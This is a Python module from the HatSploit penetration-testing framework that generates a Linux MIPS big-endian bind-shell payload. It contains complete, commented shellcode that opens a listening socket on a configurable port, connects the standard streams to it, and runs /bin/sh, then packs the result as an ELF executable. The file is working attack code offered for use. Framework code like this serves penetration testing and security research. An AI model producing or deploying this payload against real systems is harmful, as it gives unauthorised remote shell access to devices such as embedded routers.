#!/usr/bin/env python3

#
# MIT License
#
# Copyright (c) 2020-2021 EntySec
#
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
#
# The above copyright notice and this permission notice shall be included in all
# copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.
#

from core.lib.payload import Payload
from utils.payload.payload import PayloadGenerator


class HatSploitPayload(Payload, PayloadGenerator):
    details = {
        'Category': "stager",
        'Name': "Linux mipsbe Shell Bind TCP",
        'Payload': "linux/mipsbe/shell_bind_tcp",
        'Authors': [
            'Ivan Nikolsky (enty8080)'
        ],
        'Description': "Shell bind TCP payload for Linux mipsbe.",
        'Dependencies': [
            ''
        ],
        'Comments': [
            ''
        ],
        'Architecture': "mipsbe",
        'Platform': "linux",
        'Risk': "high",
        'Type': "bind_tcp"
    }

    options = {
        'BPORT': {
            'Description': "Bind port.",
            'Value': 8888,
            'Type': "port",
            'Required': True
        },
        'FORMAT': {
            'Description': "Executable format.",
            'Value': "elf",
            'Type': None,
            'Required': True
        }
    }

    def run(self):
        bind_port, executable_format = self.parse_options(self.options)
        bind_port = self.port_to_bytes(bind_port)

        if executable_format not in self.formats.keys():
            self.output_error("Invalid executable format!")
            return

        self.output_process("Generating shellcode...")
        shellcode = (
            # socket(PF_INET, SOCK_STREAM, IPPROTO_IP) = 3
                b"\x27\xbd\xff\xe0" +  # addiu   sp,sp,-32
                b"\x24\x0e\xff\xfd" +  # li      t6,-3
                b"\x01\xc0\x20\x27" +  # nor     a0,t6,zero
                b"\x01\xc0\x28\x27" +  # nor     a1,t6,zero
                b"\x28\x06\xff\xff" +  # slti    a2,zero,-1
                b"\x24\x02\x10\x57" +  # li      v0,4183 ( __NR_socket )
                b"\x01\x01\x01\x0c" +  # syscall

                # bind(3, {sa_family=AF_INET, sin_port=htons(8888), sin_addr=inet_addr("0.0.0.0")}, 16) = 0
                b"\x30\x50\xff\xff" +  # andi    s0,v0,0xffff
                b"\x24\x0e\xff\xef" +  # li      t6,-17                        ; t6: 0xffffffef
                b"\x01\xc0\x70\x27" +  # nor     t6,t6,zero                    ; t6: 0x10 (16)
                b"\x24\x0d\xff\xfd" +  # li      t5,-3                         ; t5: -3
                b"\x01\xa0\x68\x27" +  # nor     t5,t5,zero                    ; t5: 0x2
                b"\x01\xcd\x68\x04" +  # sllv    t5,t5,t6                      ; t5: 0x00020000
                b"\x24\x0e" + bind_port +  # li      t6,0xFFFF (port)   ; t6: 0x115c (8888 (default LPORT))
                b"\x01\xae\x68\x25" +  # or      t5,t5,t6                      ; t5: 0x0002115c
                b"\xaf\xad\xff\xe0" +  # sw      t5,-32(sp)
                b"\xaf\xa0\xff\xe4" +  # sw      zero,-28(sp)
                b"\xaf\xa0\xff\xe8" +  # sw      zero,-24(sp)
                b"\xaf\xa0\xff\xec" +  # sw      zero,-20(sp)
                b"\x02\x10\x20\x25" +  # or      a0,s0,s0
                b"\x24\x0e\xff\xef" +  # li      t6,-17
                b"\x01\xc0\x30\x27" +  # nor     a2,t6,zero
                b"\x23\xa5\xff\xe0" +  # addi    a1,sp,-32
                b"\x24\x02\x10\x49" +  # li      v0,4169 ( __NR_bind )A
                b"\x01\x01\x01\x0c" +  # syscall

                # listen(3, 257) = 0
                b"\x02\x10\x20\x25" +  # or      a0,s0,s0
                b"\x24\x05\x01\x01" +  # li      a1,257
                b"\x24\x02\x10\x4e" +  # li      v0,4174 ( __NR_listen )
                b"\x01\x01\x01\x0c" +  # syscall

                # accept(3, 0, NULL) = 4
                b"\x02\x10\x20\x25" +  # or      a0,s0,s0
                b"\x28\x05\xff\xff" +  # slti    a1,zero,-1
                b"\x28\x06\xff\xff" +  # slti    a2,zero,-1
                b"\x24\x02\x10\x48" +  # li      v0,4168 ( __NR_accept )
                b"\x01\x01\x01\x0c" +  # syscall

                # dup2(4, 2) = 2
                # dup2(4, 1) = 1
                # dup2(4, 0) = 0
                b"\xaf\xa2\xff\xff" +  # sw v0,-1(sp) # socket
                b"\x24\x11\xff\xfd" +  # li s1,-3
                b"\x02\x20\x88\x27" +  # nor s1,s1,zero
                b"\x8f\xa4\xff\xff" +  # lw a0,-1(sp)
                b"\x02\x20\x28\x21" +  # move a1,s1 # dup2_loop
                b"\x24\x02\x0f\xdf" +  # li v0,4063 ( __NR_dup2 )
                b"\x01\x01\x01\x0c" +  # syscall 0x40404
                b"\x24\x10\xff\xff" +  # li s0,-1
                b"\x22\x31\xff\xff" +  # addi s1,s1,-1
                b"\x16\x30\xff\xfa" +  # bne s1,s0 <dup2_loop>

                # execve("//bin/sh", ["//bin/sh"], [/* 0 vars */]) = 0
                b"\x28\x06\xff\xff" +  # slti a2,zero,-1
                b"\x3c\x0f\x2f\x2f" +  # lui t7,0x2f2f "//"
                b"\x35\xef\x62\x69" +  # ori t7,t7,0x6269 "bi"
                b"\xaf\xaf\xff\xec" +  # sw t7,-20(sp)
                b"\x3c\x0e\x6e\x2f" +  # lui t6,0x6e2f "n/"
                b"\x35\xce\x73\x68" +  # ori t6,t6,0x7368 "sh"
                b"\xaf\xae\xff\xf0" +  # sw t6,-16(sp)
                b"\xaf\xa0\xff\xf4" +  # sw zero,-12(sp)
                b"\x27\xa4\xff\xec" +  # addiu a0,sp,-20
                b"\xaf\xa4\xff\xf8" +  # sw a0,-8(sp)
                b"\xaf\xa0\xff\xfc" +  # sw zero,-4(sp)
                b"\x27\xa5\xff\xf8" +  # addiu a1,sp,-8
                b"\x24\x02\x0f\xab" +  # li v0,4011 ( __NR_execve )
                b"\x01\x01\x01\x0c"  # syscall 0x40404
        )

        self.output_process("Generating payload...")
        payload = self.generate(executable_format, 'mipsbe', shellcode)

        return payload
